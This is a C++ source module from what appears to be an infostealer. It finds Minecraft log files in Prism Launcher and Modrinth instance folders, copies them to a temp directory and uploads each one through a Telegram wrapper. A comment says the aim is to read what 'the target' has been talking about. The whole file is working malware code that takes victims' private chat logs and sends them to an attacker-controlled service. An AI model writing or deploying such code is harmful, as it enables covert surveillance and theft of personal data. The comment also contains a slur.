#include "pch.h"
#include "minecraft.h"
#include "../wrappers/telegram.h"

#include <cstdlib>
#include <filesystem>

namespace fs = std::filesystem;

/*
this might seem retarded getting minecraft logs but
this will get what the target has been talking about in minecraft logs
*/

namespace grab {
    void prism() {
        const char* appDataEnv = std::getenv("APPDATA");
        const char* tempEnv = std::getenv("TEMP");

        if (!appDataEnv || !tempEnv)
            return;

        fs::path instancesPath = fs::path(appDataEnv) / "PrismLauncher" / "instances";

        if (!fs::exists(instancesPath)) return;

        for (const auto& entry : fs::directory_iterator(instancesPath)) {
            if (!entry.is_directory()) continue;

            fs::path logPath = entry.path() / "minecraft" / "logs" / "latest.log";

            if (!fs::exists(logPath))
                continue;

            std::string instanceName = entry.path().filename().string();
            fs::path destination = fs::path(tempEnv) / "juni_prism" / (instanceName + "_log_prism.txt");

            fs::create_directories(destination.parent_path());
            fs::copy_file(logPath, destination, fs::copy_options::overwrite_existing);

            telegram::SendDocument(destination.string());
        }
    }

    void modrinth() {
        const char* appDataEnv = std::getenv("APPDATA");
        const char* tempEnv = std::getenv("TEMP");

        if (!appDataEnv || !tempEnv)
            return;

        fs::path instancesPath = fs::path(appDataEnv) / "ModrinthApp" / "profiles";

        if (!fs::exists(instancesPath)) return;

        for (const auto& entry : fs::directory_iterator(instancesPath)) {
            if (!entry.is_directory())
                continue;

            fs::path logPath = entry.path() / "logs" / "latest.log";

            if (!fs::exists(logPath)) continue;

            std::string instanceName = entry.path().filename().string();

            fs::path destination = fs::path(tempEnv) / "juni_modrinth" / (instanceName + "_log_modrinth.txt");
            fs::create_directories(destination.parent_path());
            fs::copy_file(logPath, destination, fs::copy_options::overwrite_existing);

            telegram::SendDocument(destination.string());
        }
    }

    void getMinecraftLogs() {
        prism();
        modrinth();
    }
}